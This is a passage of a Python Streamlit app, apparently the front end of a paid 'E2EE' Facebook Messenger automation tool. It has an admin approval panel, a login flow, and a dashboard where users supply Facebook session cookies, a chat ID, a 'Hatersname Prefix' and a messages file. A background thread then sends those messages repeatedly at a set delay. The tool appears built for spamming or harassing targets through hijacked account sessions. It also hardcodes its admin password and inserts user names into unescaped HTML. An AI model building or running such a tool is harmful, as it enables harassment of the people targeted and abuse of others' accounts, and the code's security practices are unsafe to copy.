    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# =============== MAIN APPLICATION UI WITH PREMIUM DESIGN ===============
st.markdown('<div class="main-wrapper">', unsafe_allow_html=True)

# Premium Header
st.markdown("""
<div class="premium-header">
    <div class="logo-main"></div>
    <h1 class="main-title">WALEED E2EE PAID TOOL</h1>
    <div class="sub-title">PREMIUM AUTOMATION SUITE</div>
    <div class="badge-premium">PREMIUM EDITION • V3.0</div>
</div>
""", unsafe_allow_html=True)

# Admin Panel
if st.sidebar.checkbox("🔐 Admin Login"):
    with st.sidebar.container():
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown('<div class="card-title">Admin Access</div>', unsafe_allow_html=True)
        admin_username = st.text_input("Admin Username", key="admin_username")
        admin_password = st.text_input("Admin Password", type="password", key="admin_password")
        
        if st.button("Login as Admin", use_container_width=True):
            if admin_username == "WALEED" and admin_password == "WALEED_XD":
                st.session_state.admin_logged_in = True
                st.success("✅ Admin login successful!")
                st.rerun()
            else:
                st.error("❌ Invalid admin credentials!")
        st.markdown('</div>', unsafe_allow_html=True)

if st.session_state.admin_logged_in:
    st.markdown('<div class="premium-card">', unsafe_allow_html=True)
    st.markdown('<div class="card-title">👑 Admin Control Panel</div>', unsafe_allow_html=True)
    
    # LOGOUT BUTTON
    if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
        st.session_state.admin_logged_in = False
        st.rerun()
    
    # Get all pending approvals
    pending_users = db.get_pending_approvals()
    
    if pending_users:
        st.markdown(f"#### 📋 Pending Approvals ({len(pending_users)})")
        
        for user in pending_users:
            user_id, username, approval_key, real_name = user
            
            with st.container():
                col1, col2, col3 = st.columns([3, 1, 1])
                
                with col1:
                    st.markdown(f"""
                    <div class="user-profile pending">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
                        <span class="status-tag status-yellow">PENDING</span>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"✅ Approve", key=f"approve_{user_id}"):
                        db.update_approval_status(user_id, 'approved')
                        st.success(f"✅ Approved user: {username}")
                        st.rerun()
                
                with col3:
                    if st.button(f"❌ Reject", key=f"reject_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        st.error(f"❌ Rejected user: {username}")
                        st.rerun()
    
    # Show all approved users
    approved_users = db.get_approved_users()
    if approved_users:
        st.markdown("#### 🟢 Approved Users")
        
        for user in approved_users:
            user_id, username, approval_key, real_name, automation_running = user
            
            with st.container():
                col1, col2, col3, col4 = st.columns([3, 1, 1, 1])
                
                with col1:
                    user_config = db.get_user_config(user_id)
                    chat_id = user_config['chat_id'] if user_config else "Not configured"
                    status = "🟢 Running" if automation_running else "🔴 Stopped"
                    
                    st.markdown(f"""
                    <div class="user-profile approved">
                        <strong>👤 Username:</strong> {username}<br>
                        <strong>📝 Real Name:</strong> {real_name}<br>
                        <strong>💬 Chat ID:</strong> {chat_id}<br>
                        <strong>⚡ Status:</strong> {status}<br>
                        <span class="status-tag status-green">APPROVED</span>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        db.set_automation_running(user_id, False)
                        st.error(f"🗑️ Removed approval for: {username}")
                        st.rerun()
                
                with col3:
                    if automation_running:
                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
                            db.set_automation_running(user_id, False)
                            st.warning(f"⏹️ Stopped automation for: {username}")
                            st.rerun()
                    else:
                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                db.set_automation_running(user_id, True)
                                thread = threading.Thread(
                                    target=run_automation_with_notification, 
                                    args=(user_config, username, AutomationState(), user_id)
                                )
                                thread.daemon = True
                                thread.start()
                                st.success(f"▶️ Started automation for: {username}")
                                st.rerun()
                            else:
                                st.error("⚠️ User needs to configure chat ID first")
    
    st.markdown('</div>', unsafe_allow_html=True)

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown('<div class="card-title">Welcome Back</div>', unsafe_allow_html=True)
        
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    approval_status = db.get_approval_status(user_id)
                    
                    if approval_status == 'approved':
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = 'approved'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start and not st.session_state.automation_state.running:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                        
                        st.success(f"✅ Welcome back, {username}!")
                        st.rerun()
                    else:
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = approval_status or 'pending'
                        
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
        st.markdown('</div>', unsafe_allow_html=True)
    
    with tab2:
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown('<div class="card-title">Create New Account</div>', unsafe_allow_html=True)
        
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    result = db.create_user(new_username, new_password)
                    
                    if isinstance(result, tuple) and len(result) >= 2:
                        success, message = result[0], result[1]
                        user_id = result[2] if len(result) > 2 else None
                    else:
                        success = result if isinstance(result, bool) else False
                        message = "User creation completed" if success else "User creation failed"
                        user_id = None
                    
                    if success:
                        if user_id:
                            approval_key = generate_approval_key(new_username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")
        st.markdown('</div>', unsafe_allow_html=True)

else:
    # User is logged in but needs approval
    if st.session_state.approval_status != 'approved':
        st.markdown('<div class="premium-card">', unsafe_allow_html=True)
        st.markdown('<div class="card-title">🔒 Approval Required</div>', unsafe_allow_html=True)
        
        # User Info
        st.markdown(f"""
        <div style="background: rgba(30, 40, 60, 0.7); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(0, 200, 255, 0.3);">
            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">👤 User Information</h4>
            <p><strong>Username:</strong> {st.session_state.username}</p>
            <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
        </div>
        """, unsafe_allow_html=True)
        
        # Approval Key
        st.markdown(f"""
        <div style="background: linear-gradient(145deg, rgba(30,40,60,0.8), rgba(20,30,50,0.9)); padding: 25px; border-radius: 15px; margin: 25px 0; text-align: center; border: 2px solid #00ccff; box-shadow: 0 10px 30px rgba(0, 204, 255, 0.2);">
            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">🔑 Your Approval Key</h4>
            <div style="font-family: 'Orbitron', sans-serif; font-size: 1.5rem; font-weight: 700; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 10px; margin: 20px 0; border: 2px solid #00ccff; color: #00ffff; text-shadow: 0 0 10px rgba(0, 255, 255, 0.5); letter-spacing: 2px;">
                {st.session_state.approval_key}
            </div>
            <button style="font-family: 'Montserrat', sans-serif; background: linear-gradient(135deg, #0066ff, #00ccff); color: white; border: none; border-radius: 10px; padding: 12px 30px; font-weight: 600; cursor: pointer; box-shadow: 0 8px 25px rgba(0, 102, 255, 0.3); transition: all 0.3s ease;" 
                    onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 12px 35px rgba(0, 102, 255, 0.5)'" 
                    onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(0, 102, 255, 0.3)'"
                    onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">
                📋 Copy Key
            </button>
        </div>
        """, unsafe_allow_html=True)
        
        # Real Name Input
        st.markdown('<div class="card-title">📝 Enter Your Real Name</div>', unsafe_allow_html=True)
        user_real_name = st.text_input("Your Real Name", key="real_name", placeholder="Enter your real name for approval", 
                                      value=st.session_state.user_real_name)
        
        if user_real_name:
            st.session_state.user_real_name = user_real_name
            db.update_user_real_name(st.session_state.user_id, user_real_name)
        
        # Contact Buttons
        st.markdown('<div class="card-title">📞 Contact for Approval</div>', unsafe_allow_html=True)
        col1, col2, col3 = st.columns(3)
        
        with col1:
            whatsapp_url = send_approval_request_via_whatsapp(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'''
            <a href="{whatsapp_url}" target="_blank" style="text-decoration: none;">
                <div style="background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(37, 211, 102, 0.3); transition: all 0.3s ease; cursor: pointer;"
                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(37, 211, 102, 0.5)'"
                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(37, 211, 102, 0.3)'">
                    📱 WhatsApp
                </div>
            </a>
            ''', unsafe_allow_html=True)
        
        with col2:
            facebook_url = send_approval_request_via_facebook(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'''
            <a href="{facebook_url}" target="_blank" style="text-decoration: none;">
                <div style="background: linear-gradient(135deg, #1877F2, #0D5CB6); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(24, 119, 242, 0.3); transition: all 0.3s ease; cursor: pointer;"
                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(24, 119, 242, 0.5)'"
                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(24, 119, 242, 0.3)'">
                    👤 Facebook
                </div>
            </a>
            ''', unsafe_allow_html=True)
        
        with col3:
            telegram_url = send_approval_request_via_telegram(
                st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                st.session_state.approval_key
            )
            st.markdown(f'''
            <a href="{telegram_url}" target="_blank" style="text-decoration: none;">
                <div style="background: linear-gradient(135deg, #0088cc, #006699); color: white; padding: 18px; border-radius: 15px; text-align: center; font-family: \'Montserrat\', sans-serif; font-weight: 600; box-shadow: 0 8px 25px rgba(0, 136, 204, 0.3); transition: all 0.3s ease; cursor: pointer;"
                     onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 12px 35px rgba(0, 136, 204, 0.5)'"
                     onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 8px 25px rgba(0, 136, 204, 0.3)'">
                    ✈️ Telegram
                </div>
            </a>
            ''', unsafe_allow_html=True)
        
        # Check Status Button
        if st.button("🔄 Check Approval Status", use_container_width=True):
            current_status = db.get_approval_status(st.session_state.user_id)
            st.session_state.approval_status = current_status
            
            if current_status == 'approved':
                st.success("🎉 Your account has been approved!")
                st.rerun()
            else:
                st.warning("⏳ Approval pending...")
        
        # Logout
        if st.sidebar.button("🚪 Logout", use_container_width=True):
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.rerun()
        
        st.markdown('</div>', unsafe_allow_html=True)
    
    else:
        # User is approved
        if not st.session_state.auto_start_checked and st.session_state.user_id:
            st.session_state.auto_start_checked = True
            should_auto_start = db.get_automation_running(st.session_state.user_id)
            if should_auto_start and not st.session_state.automation_state.running:
                user_config = db.get_user_config(st.session_state.user_id)
                if user_config and user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
        
        st.sidebar.markdown(f'''
        <div style="background: rgba(30,40,60,0.8); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(0,200,255,0.3);">
            <h4 style="font-family: 'Montserrat', sans-serif; color: #00ccff; margin-bottom: 15px;">👤 User Profile</h4>
            <p><strong>Username:</strong> {st.session_state.username}</p>
            <p><span class="status-tag status-green">✅ Approved</span></p>
        </div>
        ''', unsafe_allow_html=True)
        
        if st.sidebar.button("🚪 Logout", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.approval_status = 'pending'
            st.session_state.approval_key = None
            st.session_state.user_real_name = ""
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.rerun()
        
        user_config = db.get_user_config(st.session_state.user_id)
        
        if user_config:
            tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
            
            with tab1:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown('<div class="card-title">Configuration Settings</div>', unsafe_allow_html=True)
                
                chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'])
                name_prefix = st.text_input("Hatersname Prefix", value=user_config['name_prefix'])
                delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, value=user_config['delay'])
                cookies = st.text_area("Facebook Cookies (optional)", value="", height=100)
                uploaded_file = st.file_uploader("Messages File Upload", type=['txt'])
                
                if uploaded_file is not None:
                    messages_content = uploaded_file.getvalue().decode("utf-8")
                else:
                    messages_content = user_config.get('messages_file_content', '')
                
                if st.button("💾 Save Configuration", use_container_width=True):
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(
                        st.session_state.user_id,
                        chat_id,
                        name_prefix,
                        delay,
                        final_cookies,
                        messages_content
                    )
                    st.success("✅ Configuration saved!")
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)
            
            with tab2:
                st.markdown('<div class="premium-card">', unsafe_allow_html=True)
                st.markdown('<div class="card-title">Automation Dashboard</div>', unsafe_allow_html=True)
                
                col1, col2, col3 = st.columns(3)
                
                with col1:
                    st.markdown(f'''
                    <div class="metric-box">
                        <div class="metric-value">{st.session_state.automation_state.message_count}</div>
                        <div class="metric-label">Messages Sent</div>
                    </div>
                    ''', unsafe_allow_html=True)
                
                with col2:
                    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                    st.markdown(f'''
                    <div class="metric-box">
                        <div class="metric-value">{status}</div>
                        <div class="metric-label">Status</div>
                    </div>
                    ''', unsafe_allow_html=True)
                
                with col3:
                    st.markdown(f'''
                    <div class="metric-box">
                        <div class="metric-value">{len(st.session_state.automation_state.logs)}</div>
                        <div class="metric-label">Total Logs</div>
                    </div>
                    ''', unsafe_allow_html=True)
                
                col1, col2 = st.columns(2)
                with col1:
                    if st.button("▶️ Start E2EE", disabled=st.session_state.automation_state.running, use_container_width=True):
                        current_config = db.get_user_config(st.session_state.user_id)
                        if current_config and current_config['chat_id']:
                            start_automation(current_config, st.session_state.user_id)
                            st.rerun()
                        else:
                            st.error("⚠️ Configure Chat ID first!")
                with col2:
                    if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
                        stop_automation(st.session_state.user_id)
                        st.rerun()
                
                st.markdown('<div class="card-title">📜 Live Logs</div>', unsafe_allow_html=True)
                if st.session_state.automation_state.logs:
                    st.markdown('<div class="log-terminal">', unsafe_allow_html=True)
                    for log in st.session_state.automation_state.logs[-30:]:
                        st.markdown(f'<div class="log-entry">{log}</div>', unsafe_allow_html=True)
                    st.markdown('</div>', unsafe_allow_html=True)
                else:
                    st.info("📝 No logs yet. Start automation to see logs here.")
                
                if st.session_state.automation_state.running:
                    time.sleep(1)
                    st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)

# Premium Footer
st.markdown("""
<div class="premium-footer">
    <div class="footer-title">WALEED E2EE PAID TOOL</div>
    <p>Premium Automation Suite • Version 3.0</p>
    <p>© 2025 Waleed XD • All Rights Reserved</p>
</div>
""", unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True)  # Close main wrapper
